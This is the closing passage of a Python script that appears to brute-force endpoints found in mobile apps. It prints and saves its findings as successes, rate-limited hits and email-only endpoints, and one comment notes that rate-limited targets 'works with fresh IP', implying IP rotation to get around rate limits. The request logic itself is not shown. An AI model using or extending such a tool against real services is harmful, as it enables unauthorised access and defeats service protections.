    email_format = [f for f in unique if f["type"] == "EMAIL_FORMAT"]

    print(f"\n  SUCCESSES: {len(successes)}")
    for f in successes:
        print(f"    AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']} method={f.get('method')}")

    print(f"\n  RATE LIMITED (=works with fresh IP): {len(rate_limited)}")
    for f in rate_limited:
        print(f"    AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']} method={f.get('method')}")

    if email_format:
        print(f"\n  EMAIL FORMAT (email-only endpoint): {len(email_format)}")
        for f in email_format:
            print(f"    AID={f['aid']} dom={f['domain']} ep={f['endpoint']}")

    with open("/home/ubuntu/apk_bruteforce_all_results.json", "w") as fp:
        json.dump({
            "total_time_seconds": elapsed,
            "unique_findings": len(unique),
            "successes": successes,
            "rate_limited": rate_limited,
            "email_format": email_format,
        }, fp, indent=2)

    print(f"\nFull results saved to /home/ubuntu/apk_bruteforce_all_results.json")


if __name__ == "__main__":
    asyncio.run(main())
